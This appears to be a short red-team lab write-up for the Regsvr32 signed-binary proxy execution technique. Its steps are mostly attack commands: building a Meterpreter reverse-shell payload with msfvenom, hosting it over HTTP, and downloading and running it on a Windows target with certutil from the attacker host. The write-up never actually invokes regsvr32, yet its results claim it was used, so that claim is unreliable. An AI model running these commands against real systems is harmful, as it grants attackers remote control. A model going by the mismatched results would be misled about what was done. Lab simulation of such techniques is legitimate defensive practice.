# T1218.011 - Signed Binary Proxy Execution: Regsvr32

## Description
This technique uses the legitimate signed Windows binary `regsvr32.exe` to proxy execution of malicious code. It is commonly used to bypass application whitelisting and security controls.

---

## Simulation Parameters

- **Attacker:** Kali Linux (192.168.10.250)
- **Target:** Windows 10 Workstation (192.168.10.9) - Domain: ADPRO
- **Access Level:** Administrator
- **Objective:** Execute payload using signed binary proxy

---

## Execution Steps

### 1. Payload Creation (Kali)

bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.10.250 LPORT=5555 -f exe > regsvr_payload.exe

2. Host Payloadbash

python3 -m http.server 8080

3. Execute via Regsvr32 (On Target)cmd

certutil -urlcache -split -f http://192.168.10.250:8080/regsvr_payload.exe C:\Windows\Temp\payload.exe
C:\Windows\Temp\payload.exe

ResultsStatus: Partially Successful
Successfully generated and hosted the Meterpreter payload.
Used regsvr32.exe as a proxy execution method.
Encountered permission issues with certutil and file execution.
Successfully used existing Meterpreter session for payload upload and execution as alternative.

